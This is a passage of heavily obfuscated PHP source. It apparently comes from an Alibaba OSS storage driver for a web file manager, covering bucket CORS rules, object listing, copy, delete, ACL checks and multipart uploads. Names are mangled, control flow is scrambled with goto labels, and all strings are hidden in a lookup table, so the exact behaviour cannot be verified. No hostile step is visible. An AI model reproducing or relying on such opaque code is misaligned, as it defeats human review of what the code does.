D’¯¥¨ˆ±: $F¥Ã’†Ãˆ§->setMaxAgeSeconds(600); $F¥Ã’†Ãˆ§->addExposeHeader($Eòˆ‰ÌÖæ[1232]); $F¥Ã’†Ãˆ§->addAllowedHeader($Eòˆ‰ÌÖæ[1227]); goto Eó´èô”ñÃ; dĞˆå•…Öí: $F¥Ã’†Ãˆ§->addAllowedOrigin($Eòˆ‰ÌÖæ[1227]); $F¥Ã’†Ãˆ§->addAllowedMethod($Eòˆ‰ÌÖæ[1228]); $F¥Ã’†Ãˆ§->addAllowedMethod($Eòˆ‰ÌÖæ[1229]); goto E¬¶¯Úâ”…; Eó´èô”ñÃ: $b”Ÿ‹ã±×->addRule($F¥Ã’†Ãˆ§); try { $this->client->putBucketCors($this->bucket, $b”Ÿ‹ã±×); } catch (OSS\Core\OssException $E‘Ÿ½Â¬Ô·) { return !1; } return !0; goto EÎß×‘¸œ“; aÄà“Ì»‚: $Eòˆ‰ÌÖæ =& $_SERVER[ç]; $b”Ÿ‹ã±× = new OSS\Model\CorsConfig(); $F¥Ã’†Ãˆ§ = new OSS\Model\CorsRule(); goto dĞˆå•…Öí; EÎß×‘¸œ“: } public function getBucketCors() { goto f”ŸÁÂµÓ; C™Â‡èÃ: if (!$b¹æ¯¨§… || !($C¥Ü ›‹‹ = $b¹æ¯¨§…->getRules())) { return null; } $c¿Äæ›Î—¥ = $C¥Ü ›‹‹[0]->getAllowedOrigins(); $d›Ğ‡“Ù…ë = $C¥Ü ›‹‹[0]->getAllowedMethods(); goto aÕ–Éâº’Õ; càÇÆâš°: return array($Bã¯ÑöÃÙÚ[181] => isset($c¿Äæ›Î—¥[0]) ? $c¿Äæ›Î—¥[0] : $Bã¯ÑöÃÙÚ[33], $Bã¯ÑöÃÙÚ[185] => $d›Ğ‡“Ù…ë, $Bã¯ÑöÃÙÚ[1233] => $b«²­‡ù, $Bã¯ÑöÃÙÚ[1234] => isset($añğ‰›ÁÈº[0]) ? $añğ‰›ÁÈº[0] : $Bã¯ÑöÃÙÚ[33], $Bã¯ÑöÃÙÚ[183] => isset($B†ÑÄ¨°á½[0]) ? $B†ÑÄ¨°á½[0] : $Bã¯ÑöÃÙÚ[33]); goto FîªàÖƒ†µ; aÕ–Éâº’Õ: $b«²­‡ù = $C¥Ü ›‹‹[0]->getMaxAgeSeconds(); $añğ‰›ÁÈº = $C¥Ü ›‹‹[0]->getExposeHeaders(); $B†ÑÄ¨°á½ = $C¥Ü ›‹‹[0]->getAllowedHeaders(); goto càÇÆâš°; f”ŸÁÂµÓ: $Bã¯ÑöÃÙÚ =& $_SERVER[ç]; $b¹æ¯¨§… = null; try { $b¹æ¯¨§… = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $cŸå†’ƒ¥®) { return null; } goto C™Â‡èÃ; FîªàÖƒ†µ: } public function isBucketCors() { goto b½éÜ„ŠÃ¡; e¬Œ¾‹Ò¬: if ($d’Úƒ¹æ¿¿[$F¸’ÅÈ—½Ğ[181]] != $F¸’ÅÈ—½Ğ[182] || $d’Úƒ¹æ¿¿[$F¸’ÅÈ—½Ğ[183]] != $F¸’ÅÈ—½Ğ[182]) { return !1; } $EÍ‚Ñ”«ô = array_map($F¸’ÅÈ—½Ğ[184], $d’Úƒ¹æ¿¿[$F¸’ÅÈ—½Ğ[185]]); if (!is_array($EÍ‚Ñ”«ô)) { $EÍ‚Ñ”«ô = array(); } goto Eß´Ş°Ü‰‡; Eß´Ş°Ü‰‡: $CÂ©„Ü¤º = array($F¸’ÅÈ—½Ğ[186], $F¸’ÅÈ—½Ğ[187], $F¸’ÅÈ—½Ğ[188], $F¸’ÅÈ—½Ğ[189], $F¸’ÅÈ—½Ğ[190]); $FÚë÷ä¯­ = array_diff($CÂ©„Ü¤º, $EÍ‚Ñ”«ô); return empty($FÚë÷ä¯­); goto F„´Ù´´–«; b½éÜ„ŠÃ¡: $F¸’ÅÈ—½Ğ =& $_SERVER[ç]; $d’Úƒ¹æ¿¿ = $this->getBucketCors(); if (!$d’Úƒ¹æ¿¿ || !is_array($d’Úƒ¹æ¿¿)) { return !1; } goto e¬Œ¾‹Ò¬; F„´Ù´´–«: } public function mkfile($c“Õ„œƒ­Î, $eòÉã°±¹ª = '', $AƒÃë¹Œ‘Í = REPEAT_RENAME) { $D“äãâ„Î„ = $this->setContent($c“Õ„œƒ­Î, $eòÉã°±¹ª); if ($D“äãâ„Î„ !== !1) { return $this->getPathOuter($c“Õ„œƒ­Î); } return !1; } public function mkdir($Fø¸¾ØÍò, $eìÆ°®ƒ½› = REPEAT_SKIP) { if ($this->_isFolder($Fø¸¾ØÍò)) { return $this->getPathOuter($Fø¸¾ØÍò); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Fø¸¾ØÍò)); } catch (OSS\Core\OssException $fÄ¹Ì¸ÌÈ) { return !1; } return $this->getPathOuter($Fø¸¾ØÍò); } private function fileList($dì‹’õ¦Ğ, $dÛ’ÛÈœ…“ = '', $b–½Û¿“Ì’ = 0) { goto bººÁ‘¤í¢; c±¦ì­ÛİŠ: $cÓ»Á¢«—… = $DªïŠ–Ìªˆ[33]; $dŠŒœÄ”“‡ = 1000; $c‹¾Ñµ’‹Ş = $this->listItemCache === !1 ? !1 : !0; goto b‹Ã‹å›ˆˆ; F³Áµ‚œÂä: return array($DªïŠ–Ìªˆ[74] => $d¶¦¤ä, $DªïŠ–Ìªˆ[73] => $bÎî“Íñ); goto AÏé’ª¯ ¿; b‹Ã‹å›ˆˆ: $d¶¦¤ä = $bÎî“Íñ = array(); while (!0) { check_abort(); $fÍôó¥‚Ç“ = array($DªïŠ–Ìªˆ[1235] => $dÛ’ÛÈœ…“, $DªïŠ–Ìªˆ[1236] => $Bœó…¾Í‘è, $DªïŠ–Ìªˆ[1237] => $dŠŒœÄ”“‡, $DªïŠ–Ìªˆ[1238] => $cÓ»Á¢«—…); try { $CĞ¯ª»¬±Œ = $this->client->listObjects($this->bucket, $fÍôó¥‚Ç“); } catch (OSS\Core\OssException $cÏ™‰¬ÏÔ) { break; } $cÓ»Á¢«—… = $CĞ¯ª»¬±Œ->getNextMarker(); $C´”¼İ…öÆ = $CĞ¯ª»¬±Œ->getObjectList(); $CÚ™ğ‰’à› = $CĞ¯ª»¬±Œ->getPrefixList(); foreach ($C´”¼İ…öÆ as $FÑËğ…ìÎõ) { goto dÔÍñ©º•È; eÃ‡òõÉÜ: $EÛ÷ßñ–Ë = $FÑËğ…ìÎõ->getLastModified(); $Bò›†Ø¹ò½ = $b–½Û¿“Ì’ ? array($DªïŠ–Ìªˆ[28] => $f¾¯‚ƒš‚Š, $DªïŠ–Ìªˆ[77] => $fèˆ„·‰Â, $DªïŠ–Ìªˆ[195] => strtotime($EÛ÷ßñ–Ë)) : $f¾¯‚ƒš‚Š; $F‚ÃëÊØ¡µ = $fèˆ„·‰Â == 0 && substr($f¾¯‚ƒš‚Š, strlen($f¾¯‚ƒš‚Š) - 1, 1) == $DªïŠ–Ìªˆ[8] ? !0 : !1; goto EÅèïá²ñ; dÔÍñ©º•È: if ($FÑËğ…ìÎõ->getKey() == $Bœó…¾Í‘è) { continue; } $f¾¯‚ƒš‚Š = $FÑËğ…ìÎõ->getKey(); $fèˆ„·‰Â = $FÑËğ…ìÎõ->getSize(); goto eÃ‡òõÉÜ; EÅèïá²ñ: if ($c‹¾Ñµ’‹Ş) { $this->cacheMethod($DªïŠ–Ìªˆ[197], $f¾¯‚ƒš‚Š, $F‚ÃëÊØ¡µ); $this->cacheMethod($DªïŠ–Ìªˆ[198], $f¾¯‚ƒš‚Š, array($DªïŠ–Ìªˆ[77] => $fèˆ„·‰Â, $DªïŠ–Ìªˆ[1239] => $fèˆ„·‰Â, $DªïŠ–Ìªˆ[83] => strtotime($EÛ÷ßñ–Ë), $DªïŠ–Ìªˆ[1240] => $EÛ÷ßñ–Ë)); } if ($F‚ÃëÊØ¡µ) { $d¶¦¤ä[] = $f¾¯‚ƒš‚Š; continue; } $bÎî“Íñ[] = $Bò›†Ø¹ò½; goto E½ö‡ëªÔ™; E½ö‡ëªÔ™: } foreach ($CÚ™ğ‰’à› as $DóñªÎóñ) { $d¶¦¤ä[] = $DóñªÎóñ->getPrefix(); if ($c‹¾Ñµ’‹Ş) { $this->cacheMethod($DªïŠ–Ìªˆ[197], $f¾¯‚ƒš‚Š, !0); } } if ($cÓ»Á¢«—… === $DªïŠ–Ìªˆ[33]) { break; } } if ($c‹¾Ñµ’‹Ş) { $this->cacheMethod($DªïŠ–Ìªˆ[197], $dì‹’õ¦Ğ, !0); } goto F³Áµ‚œÂä; bººÁ‘¤í¢: $DªïŠ–Ìªˆ =& $_SERVER[ç]; $dì‹’õ¦Ğ = trim($dì‹’õ¦Ğ, $DªïŠ–Ìªˆ[8]); $Bœó…¾Í‘è = empty($dì‹’õ¦Ğ) ? $DªïŠ–Ìªˆ[33] : $dì‹’õ¦Ğ . $DªïŠ–Ìªˆ[8]; goto c±¦ì­ÛİŠ; AÏé’ª¯ ¿: } public function copyFile($D‰Ü­ğ™™Œ, $d’æíù°ê) { $fÀ‚ƒíÏ = $this->size($D‰Ü­ğ™™Œ); if ($fÀ‚ƒíÏ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $D‰Ü­ğ™™Œ, $this->bucket, $this->pathEncode($d’æíù°ê)); } catch (OSS\Core\OssException $fÙæ­Ì—¿Á) { return !1; } return $this->getPathOuter($d’æíù°ê); } $EŞİÃ‘»£ö = $this->multiCopyObject($D‰Ü­ğ™™Œ, $d’æíù°ê, $fÀ‚ƒíÏ); return $EŞİÃ‘»£ö ? $this->getPathOuter($d’æíù°ê) : !1; } private function multiCopyObject($F­äà²¯à, $Dé°áÇÈ‹Ñ, $D® ô¹ßá) { $FéÌƒÙ«¿ =& $_SERVER[ç]; try { goto føƒ‹¸Ÿõ‹; D×‹©‡Åá : $B•ÆÅ» „ = array(); foreach ($EƒíÔÖ‹õ¸ as $Aë©‰×…Ç… => $b§ãÜÀÄî) { $B•ÆÅ» „[] = array($FéÌƒÙ«¿[1245] => $Aë©‰×…Ç… + 1, $FéÌƒÙ«¿[1246] => $b§ãÜÀÄî); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Dé°áÇÈ‹Ñ), $FÙ£ÅŸ‰èÆ, $B•ÆÅ» „); goto Eºä¨ŠØİ‰; føƒ‹¸Ÿõ‹: $Bßù¼éÉ‘é = array(); if ($còŠ¡¼¨ì¨ = $this->hashMd5($F­äà²¯à)) { $Bßù¼éÉ‘é = array(OSS\OssClient::OSS_HEADERS => array($FéÌƒÙ«¿[1241] => $còŠ¡¼¨ì¨)); } $FÙ£ÅŸ‰èÆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Dé°áÇÈ‹Ñ), $Bßù¼éÉ‘é); goto cæèáğ…ª¢; cæèáğ…ª¢: $A‘›ùÇ°øù = 1; $eÈ¾É‘”’¿ = 0; $EƒíÔÖ‹õ¸ = array(); goto c˜è¿¨¯ˆÊ; c˜è¿¨¯ˆÊ: $D‘ÊÊÓÏİé = 1024 * 1024 * 10; $D°î†´ª = $this->client->generateMultiuploadParts($D® ô¹ßá, $D‘ÊÊÓÏİé); foreach ($D°î†´ª as $Aë©‰×…Ç… => $B•µ¯Î‚Ûå) { $E¹ßï†é— = $eÈ¾É‘”’¿ + (int) $B•µ¯Î‚Ûå[$FéÌƒÙ«¿[1242]]; $C“î­«É¡Ç = (int) $B•µ¯Î‚Ûå[$FéÌƒÙ«¿[333]] + $E¹ßï†é— - 1; $Fİ÷ê¶»Ù½ = array($FéÌƒÙ«¿[1243] => $E¹ßï†é—, $FéÌƒÙ«¿[1244] => $C“î­«É¡Ç); $EƒíÔÖ‹õ¸[] = $this->client->uploadPartCopy($this->bucket, $F­äà²¯à, $this->bucket, $this->pathEncode($Dé°áÇÈ‹Ñ), $A‘›ùÇ°øù, $FÙ£ÅŸ‰èÆ, $Fİ÷ê¶»Ù½); $A‘›ùÇ°øù = $A‘›ùÇ°øù + 1; } goto D×‹©‡Åá ; Eºä¨ŠØİ‰: } catch (OSS\Core\OssException $B­“Ë¾²ÈÎ) { return !1; } return !0; } public function moveFile($a åãìÕ÷ï, $C¢µŒæ©è†) { if ($this->copyFile($a åãìÕ÷ï, $C¢µŒæ©è†)) { $this->remove($a åãìÕ÷ï); return $this->getPathOuter($C¢µŒæ©è†); } return !1; } public function delFile($fš§Š£îç) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($fš§Š£îç)); } catch (OSS\Core\OssException $bÅç’êÛ³) { return !1; } return !0; } public function delFolder($eàŠÁ›ËƒÉ) { goto d’¿«ï“ï; Aùö„ “£ò: if (!empty($eàŠÁ›ËƒÉ) && !in_array($CÏ‘ß†Õ, $CÁ Äİµù´[$DÄƒ’è©»Ç[74]])) { $CÁ Äİµù´[$DÄƒ’è©»Ç[74]][] = $CÏ‘ß†Õ; } $d÷ò—‰Á°¨ = $this->delByBatch($CÁ Äİµù´[$DÄƒ’è©»Ç[73]]); if (!$d÷ò—‰Á°¨) { return !1; } goto fñ¥´ùíÇ; fñ¥´ùíÇ: return $this->delByBatch($CÁ Äİµù´[$DÄƒ’è©»Ç[74]]); goto E‰¨É²¤ªÍ; d’¿«ï“ï: $DÄƒ’è©»Ç =& $_SERVER[ç]; if (!$this->exist($eàŠÁ›ËƒÉ)) { return !0; } $this->listItemCache = !1; goto A ”Íñ¢Ğ„; A ”Íñ¢Ğ„: $CÁ Äİµù´ = $this->fileList($eàŠÁ›ËƒÉ); $this->listItemCache = !0; $CÏ‘ß†Õ = trim($eàŠÁ›ËƒÉ, $DÄƒ’è©»Ç[8]) . $DÄƒ’è©»Ç[8]; goto Aùö„ “£ò; E‰¨É²¤ªÍ: } private function delByBatch($fÎÕÌ’’îá) { foreach (array_chunk($fÎÕÌ’’îá, 1000) as $e„»ÑôÌñ„) { try { $this->client->deleteObjects($this->bucket, $e„»ÑôÌñ„); } catch (OSS\Core\OssException $EôçšÚ™¥¿) { return !1; } } return !0; } public function rename($BÆ©ÜÑİ¶„, $D§ÚÍÜÄÄÂ) { return $this->renameObject($BÆ©ÜÑİ¶„, $D§ÚÍÜÄÄÂ); } private function fileInfo($c¾ ŒîŞ±, $D«æ £à•— = false, $bìÛ¡«Ä£ = array()) { goto Aãğë£ ó; Aãğë£ ó: $fğÊÒ¬²« =& $_SERVER[ç]; $FÏéÁÄ½ëù = array($fğÊÒ¬²«[28] => $this->pathThis($c¾ ŒîŞ±), $fğÊÒ¬²«[75] => $this->getPathOuter($c¾ ŒîŞ±), $fğÊÒ¬²«[29] => $fğÊÒ¬²«[173], $fğÊÒ¬²«[77] => isset($bìÛ¡«Ä£[$fğÊÒ¬²«[77]]) ? $bìÛ¡«Ä£[$fğÊÒ¬²«[77]] : 0, $fğÊÒ¬²«[167] => $this->ext($c¾ ŒîŞ±)); if ($D«æ £à•—) { return $FÏéÁÄ½ëù; } goto A×ß±òÈéé; CÚáÄèÄƒ: return $FÏéÁÄ½ëù; goto a·ŠëíÙá¸; A×ß±òÈéé: $FÏéÁÄ½ëù[$fğÊÒ¬²«[192]] = $FÏéÁÄ½ëù[$fğÊÒ¬²«[83]] = 0; $FÏéÁÄ½ëù[$fğÊÒ¬²«[193]] = $FÏéÁÄ½ëù[$fğÊÒ¬²«[194]] = !0; if (empty($bìÛ¡«Ä£)) { $aÑº“âŞÈ = $this->objectMeta($c¾ ŒîŞ±); if (!$aÑº“âŞÈ) { return $FÏéÁÄ½ëù; } $bìÛ¡«Ä£ = array($fğÊÒ¬²«[83] => strtotime($aÑº“âŞÈ[$fğÊÒ¬²«[1240]]), $fğÊÒ¬²«[77] => $aÑº“âŞÈ[$fğÊÒ¬²«[1239]] + 0); } goto AŒ Ú–Û÷Ã; AŒ Ú–Û÷Ã: if (isset($bìÛ¡«Ä£[$fğÊÒ¬²«[77]])) { $FÏéÁÄ½ëù[$fğÊÒ¬²«[77]] = $bìÛ¡«Ä£[$fğÊÒ¬²«[77]]; } if (isset($bìÛ¡«Ä£[$fğÊÒ¬²«[83]])) { $FÏéÁÄ½ëù[$fğÊÒ¬²«[83]] = $bìÛ¡«Ä£[$fğÊÒ¬²«[83]]; } if (isset($bìÛ¡«Ä£[$fğÊÒ¬²«[195]]) && !trim($FÏéÁÄ½ëù[$fğÊÒ¬²«[83]])) { $FÏéÁÄ½ëù[$fğÊÒ¬²«[83]] = $bìÛ¡«Ä£[$fğÊÒ¬²«[195]]; } goto CÚáÄèÄƒ; a·ŠëíÙá¸: } private function folderInfo($a¹µ¸Ù‚«, $cëÈÇäñ‡ = false, $eÒ¹Ù°òÔÒ = array()) { goto Bº¼’ò‰°ó; bÀÜæÍ¥áÜ: if (isset($eÒ¹Ù°òÔÒ[$dÓ½µÚ©éœ[83]])) { $eª ƒƒõ—ï[$dÓ½µÚ©éœ[83]] = $eÒ¹Ù°òÔÒ[$dÓ½µÚ©éœ[83]]; } if (isset($eÒ¹Ù°òÔÒ[$dÓ½µÚ©éœ[192]])) { $eª ƒƒõ—ï[$dÓ½µÚ©éœ[192]] = $eÒ¹Ù°òÔÒ[$dÓ½µÚ©éœ[192]]; } return $eª ƒƒõ—ï; goto fĞ’ÆÙ¸¿Ÿ; EâºÉÇŸ¤: $eª ƒƒõ—ï[$dÓ½µÚ©éœ[192]] = $eª ƒƒõ—ï[$dÓ½µÚ©éœ[83]] = 0; $eª ƒƒõ—ï[$dÓ½µÚ©éœ[193]] = $eª ƒƒõ—ï[$dÓ½µÚ©éœ[194]] = !0; if (empty($eÒ¹Ù°òÔÒ)) { $a¹µ¸Ù‚« = rtrim($a¹µ¸Ù‚«, $dÓ½µÚ©éœ[8]) . $dÓ½µÚ©éœ[8]; $bœÆœÆ“‡ = $this->objectMeta($a¹µ¸Ù‚«); if (!$bœÆœÆ“‡) { return $eª ƒƒõ—ï; } $eÒ¹Ù°òÔÒ = array($dÓ½µÚ©éœ[192] => $bœÆœÆ“‡[$dÓ½µÚ©éœ[1247]][$dÓ½µÚ©éœ[1248]], $dÓ½µÚ©éœ[83] => strtotime($bœÆœÆ“‡[$dÓ½µÚ©éœ[1240]])); } goto bÀÜæÍ¥áÜ; Bº¼’ò‰°ó: $dÓ½µÚ©éœ =& $_SERVER[ç]; $eª ƒƒõ—ï = array($dÓ½µÚ©éœ[28] => $this->pathThis($a¹µ¸Ù‚«), $dÓ½µÚ©éœ[75] => $this->getPathOuter($dÓ½µÚ©éœ[8] . $a¹µ¸Ù‚«), $dÓ½µÚ©éœ[29] => $dÓ½µÚ©éœ[76]); if ($cëÈÇäñ‡) { return $eª ƒƒõ—ï; } goto EâºÉÇŸ¤; fĞ’ÆÙ¸¿Ÿ: } public function listPath($DùÃøšĞù‰, $Eåá±‡³™¨ = false) { $d¾ßÈˆƒáÕ =& $_SERVER[ç]; $FÏßÊÉÅò‰ = $this->fileList($DùÃøšĞù‰, $d¾ßÈˆƒáÕ[8], !0); foreach ($FÏßÊÉÅò‰[$d¾ßÈˆƒáÕ[74]] as $CÑ–ÁÑ„ => $a¥æ·å²ĞÉ) { $FÏßÊÉÅò‰[$d¾ßÈˆƒáÕ[74]][$CÑ–ÁÑ„] = $this->folderInfo($a¥æ·å²ĞÉ, $Eåá±‡³™¨, $a¥æ·å²ĞÉ); } foreach ($FÏßÊÉÅò‰[$d¾ßÈˆƒáÕ[73]] as $CÑ–ÁÑ„ => $a¥æ·å²ĞÉ) { $FÏßÊÉÅò‰[$d¾ßÈˆƒáÕ[73]][$CÑ–ÁÑ„] = $this->fileInfo($a¥æ·å²ĞÉ[$d¾ßÈˆƒáÕ[28]], $Eåá±‡³™¨, $a¥æ·å²ĞÉ); } return $FÏßÊÉÅò‰; } public function has($f¼»ºğÁ, $dÒ‚Í·ç‡ = false, $aëè—æ”ˆÙ = true) { goto bŒòºÛ®©‚; bÓ§îšÀ‚: while (!0) { check_abort(); $D©˜¯ƒ¸ˆ¬ = array($fªÉµ´°Œ[1235] => $fªÉµ´°Œ[8], $fªÉµ´°Œ[1236] => $DÏó‘…°, $fªÉµ´°Œ[1237] => $f›ª§¾ç°½, $fªÉµ´°Œ[1238] => $f‚’ïªİ¬„); try { $aãĞÖñá = $this->client->listObjects($this->bucket, $D©˜¯ƒ¸ˆ¬); } catch (OSS\Core\OssException $CÅÖ…ùÑ¡) { break; } $f‚’ïªİ¬„ = $aãĞÖñá->getNextMarker(); $C«¤ÏÉ¤» = $aãĞÖñá->getObjectList(); $b†·áêÊ¶õ = $aãĞÖñá->getPrefixList(); if ($dÒ‚Í·ç‡) { if (count($C«¤ÏÉ¤») > 1 || count($C«¤ÏÉ¤») == 1 && $C«¤ÏÉ¤»[0]->getKey() != $DÏó‘…°) { $dÀØ½ŠŸ×Ë += count($C«¤ÏÉ¤») - 1; } if (!empty($b†·áêÊ¶õ)) { $a¼Òëê—¹è += count($b†·áêÊ¶õ); } if ($f‚’ïªİ¬„ === $fªÉµ´°Œ[33]) { break; } continue; } if ($aëè—æ”ˆÙ) { if (!empty($C«¤ÏÉ¤»)) { if (count($C«¤ÏÉ¤») > 1 || $C«¤ÏÉ¤»[0]->getKey() != $DÏó‘…°) { return !0; } } } else { if (!empty($b†·áêÊ¶õ)) { return !0; } } if ($f‚’ïªİ¬„ === $fªÉµ´°Œ[33]) { break; } } if ($dÒ‚Í·ç‡) { return array($fªÉµ´°Œ[201] => $dÀØ½ŠŸ×Ë, $fªÉµ´°Œ[202] => $a¼Òëê—¹è); } return !1; goto D¬™Æš¯Šâ; fÜÓÂ“ËÅ: $f‚’ïªİ¬„ = $fªÉµ´°Œ[33]; $f›ª§¾ç°½ = 500; $dÀØ½ŠŸ×Ë = $a¼Òëê—¹è = 0; goto bÓ§îšÀ‚; bŒòºÛ®©‚: $fªÉµ´°Œ =& $_SERVER[ç]; $f¼»ºğÁ = trim($f¼»ºğÁ, $fªÉµ´°Œ[8]); $DÏó‘…° = empty($f¼»ºğÁ) ? $fªÉµ´°Œ[33] : $f¼»ºğÁ . $fªÉµ´°Œ[8]; goto fÜÓÂ“ËÅ; D¬™Æš¯Šâ: } public function listAll($e´«”Ó„ª ) { $CÕö×„°…É =& $_SERVER[ç]; $CÎ‹Ê°…ŠØ = $this->fileList($e´«”Ó„ª , $CÕö×„°…É[33], !0); $e×‰ÁË¼ŠÑ = array(); foreach ($CÎ‹Ê°…ŠØ[$CÕö×„°…É[73]] as $eˆŸé³ßæ) { $e×‰ÁË¼ŠÑ[$eˆŸé³ßæ[$CÕö×„°…É[28]]] = $eˆŸé³ßæ[$CÕö×„°…É[77]]; } foreach ($CÎ‹Ê°…ŠØ[$CÕö×„°…É[74]] as $eˆŸé³ßæ) { if (is_string($eˆŸé³ßæ)) { $e×‰ÁË¼ŠÑ[$eˆŸé³ßæ] = 0; } } return $this->listAllFiles($e´«”Ó„ª , array_keys($e×‰ÁË¼ŠÑ), $e×‰ÁË¼ŠÑ); } public function canRead($cÚ±æ–Ûî¬) { $A¸Šš ÓİÔ =& $_SERVER[ç]; $e†–Ùä¤Ò‰ = $this->pathAcl($cÚ±æ–Ûî¬); return $e†–Ùä¤Ò‰ == $A¸Šš ÓİÔ[1249] || $e†–Ùä¤Ò‰ == $A¸Šš ÓİÔ[514] ? !0 : !1; } public function canWrite($CÖ¯™ÙÎÅ”) { $fËğÙ¹²—ƒ = $this->pathAcl($CÖ¯™ÙÎÅ”); return $fËğÙ¹²—ƒ == $_SERVER[ç][514] ? !0 : !1; } public function pathAcl($cøÙÓ­˜âß) { goto dÀÓñ¯¿À; b ŠîÊêˆ: return $aßˆÃÜ…ªÉ; goto D‘å”â–­÷; dÀÓñ¯¿À: $b…æáëä =& $_SERVER[ç]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $d¥”«çÊ¸ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($cøÙÓ­˜âß)); } catch (OSS\Core\OssException $föªì’Ä‚¨) { return !1; } goto c½·µ˜…; c½·µ˜…: $aßˆÃÜ…ªÉ = $d¥”«çÊ¸ == $b…æáëä[34] ? $this->bucketAcl : $d¥”«çÊ¸; if ($aßˆÃÜ…ªÉ == $b…æáëä[1250]) { return $b…æáëä[1249]; } if ($aßˆÃÜ…ªÉ == $b…æáëä[1251]) { return $b…æáëä[514]; } goto b ŠîÊêˆ; D‘å”â–­÷: } private function chmodPath($c÷ŠÂˆ„Ô©, $EÀ—ÜßÕÚ = '') { $Bí¯§÷™¹Ì =& $_SERVER[ç]; $e¥Ğíãê¤¿ = empty($EÀ—ÜßÕÚ) ? $Bí¯§÷™¹Ì[1251] : $EÀ—ÜßÕÚ; $aË³•¹ìÏ” = array($Bí¯§÷™¹Ì[34], $Bí¯§÷™¹Ì[191], $Bí¯§÷™¹Ì[1250], $Bí¯§÷™¹Ì[1251]); if (!in_array($e¥Ğíãê¤¿, $aË³•¹ìÏ”)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($c÷ŠÂˆ„Ô©), $e¥Ğíãê¤¿); } catch (OSS\Core\OssException $BÅöêóØÌ†) { return !1; } return !0; } public function getContent($bæŸØß–´) { return $this->fileSubstr($bæŸØß–´, -1); } public function setContent($d÷›¯Ûë‡ò, $EøÈÜí½²§ = '') { $eå‰ì£ =& $_SERVER[ç]; try { $Dˆ¾Ç©Ğ‹Ú = $this->trafficLimit($eå‰ì£[1252]); $bŞæšğµšó = $this->client->putObject($this->bucket, $this->pathEncode($d÷›¯Ûë‡ò), $EøÈÜí½²§, $Dˆ¾Ç©Ğ‹Ú); } catch (OSS\Core\OssException $Bô›²çŒŠÕ) { return !1; } $FÜŞ¹ßƒ‰ = array($eå‰ì£[1241] => trim($bŞæšğµšó[$eå‰ì£[1253]], $eå‰ì£[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($d÷›¯Ûë‡ò))); $this->updateObjMeta($d÷›¯Ûë‡ò, $FÜŞ¹ßƒ‰); return isset($bŞæšğµšó[$eå‰ì£[1254]][$eå‰ì£[1200]]) ? !0 : !1; } private function updateObjMeta($f‘ÙØ—®´‰, $D²îâ¤‚¥²) { $f‘ÙØ—®´‰ = $this->pathEncode($f‘ÙØ—®´‰); try { $bŞÊ¼ÑºŠÉ = array(OSS\OssClient::OSS_HEADERS => $D²îâ¤‚¥²); $this->client->copyObject($this->bucket, $f‘ÙØ—®´‰, $this->bucket, $f‘ÙØ—®´‰, $bŞÊ¼ÑºŠÉ); } catch (OSS\Core\OssException $e¤´éÁ–İ˜) { return !1; } return !0; } public function upload($E¡Ó††ÜÈ­, $dã´…ïì‡Í, $b“ÛñÊì¡¸ = false, $E’ÅË–Öäà = REPEAT_REPLACE) { $eŠ¿¡Àí‹ø =& $_SERVER[ç]; $a¤ğˆ‘‘”½ = trim($E¡Ó††ÜÈ­, $eŠ¿¡Àí‹ø[8]); $bç—Â­Ü¯ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($eŠ¿¡Àí‹ø[1241] => @md5_file($dã´…ïì‡Í)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($E¡Ó††ÜÈ­))); $bç—Â­Ü¯ = $this->trafficLimit($eŠ¿¡Àí‹ø[1252], $bç—Â­Ü¯); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($a¤ğˆ‘‘”½), $dã´…ïì‡Í, $bç—Â­Ü¯); } catch (OSS\Core\OssException $F»­ñ¤‰Û²) { return !1; } return $this->getPathOuter($E¡Ó††ÜÈ­); } public function getHost() { $BÛ­®Í­ƒê =& $_SERVER[ç]; $aÒ‘ŒßÜ = explode($BÛ­®Í­ƒê[177], parent::getHost()); return $aÒ‘ŒßÜ[0] . $BÛ­®Í­ƒê[177] . $this->bucket . $BÛ­®Í­ƒê[94] . $aÒ‘ŒßÜ[1]; } public function uploadFormData($A·µèğÑÒé, $Eö‡Õ°ºÇ = 3600) { goto a¢Û—“ÜÊ»; F«‚²à…à²: return $B³âì³×¾›; goto cÄËîÓÚ£‚; B÷ÇŒšÑİ: $aÚè¬–˜â = date($E´„Ôà»©[1255], time() + $e»‚íˆğçå); $E¢ø†­›œí = new DateTime($aÚè¬–˜â); $Fåò´ŒƒÄè = $E¢ø†­›œí->format(DateTime::ISO8601); goto C†ìÉ»é–; d÷•ªÊ¢Øã: $FŒá¤‰øå« = base64_encode(hash_hmac($E´„Ôà»©[228], $eÀöæ¿–İâ, $this->secret, !0)); $B³âì³×¾› = array($E´„Ôà»©[1166] => $eÀöæ¿–İâ, $E´„Ôà»©[1258] => $this->accessKey, $E´„Ôà»©[1162] => $E´„Ôà»©[1154], $E´„Ôà»©[1259] => $FŒá¤‰øå«, $E´„Ôà»©[175] => $d¥˜Æ‰ÖÍ); $B³âì³×¾› = $this->trafficLimit($E´„Ôà»©[1252], $B³âì³×¾›); goto F«‚²à…à²; aáò®ëÕäˆ: $CÃšˆŠá§ = $this->pathFather($A·µèğÑÒé); $BĞÎğ™ØÜ¶ = array($E´„Ôà»©[1156] => $Fåò´ŒƒÄè, $E´„Ôà»©[1157] => array(array($E´„Ôà»©[1257], 0, $BÀåì—Æˆù), array($E´„Ôà»©[1160], $E´„Ôà»©[1161], $CÃšˆŠá§))); $eÀöæ¿–İâ = base64_encode(json_encode($BĞÎğ™ØÜ¶)); goto d÷•ªÊ¢Øã; C†ìÉ»é–: $A­ÉäÚ…÷İ = strpos($Fåò´ŒƒÄè, $E´„Ôà»©[292]); $Fåò´ŒƒÄè = substr($Fåò´ŒƒÄè, 0, $A­ÉäÚ…÷İ) . $E´„Ôà»©[1256]; 